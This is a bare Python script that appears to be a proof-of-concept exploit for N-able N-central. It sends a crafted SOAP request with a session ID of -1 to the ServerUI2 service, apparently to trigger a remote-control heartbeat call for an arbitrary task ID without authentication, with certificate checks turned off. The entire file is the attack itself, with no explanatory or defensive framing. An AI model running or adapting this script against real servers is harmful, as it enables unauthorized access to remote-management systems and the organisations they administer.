#!/usr/bin/env python3
import argparse
import html
import os

import requests
import urllib3


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("task_id", type=int)
    parser.add_argument("--target", default="https://n-central.local")
    parser.add_argument("--proxy", default=os.environ.get("HTTPS_PROXY"))
    args = parser.parse_args()

    envelope = f'''<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:u="http://ui2.nobj.nable.com/">
<s:Body><u:remoteControlNotifyHeartbeatReceived><u:sessionId>-1</u:sessionId><u:remoteControlTaskId>{args.task_id}</u:remoteControlTaskId></u:remoteControlNotifyHeartbeatReceived></s:Body>
</s:Envelope>'''
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    response = requests.post(
        args.target.rstrip("/") + "/dms2/services2/ServerUI2",
        data=envelope,
        headers={"Content-Type": "application/soap+xml; charset=UTF-8"},
        proxies=proxies,
        verify=False,
        timeout=30,
    )
    print(response.status_code)
    if response.status_code != 200:
        print(html.unescape(response.text))


if __name__ == "__main__":
    main()
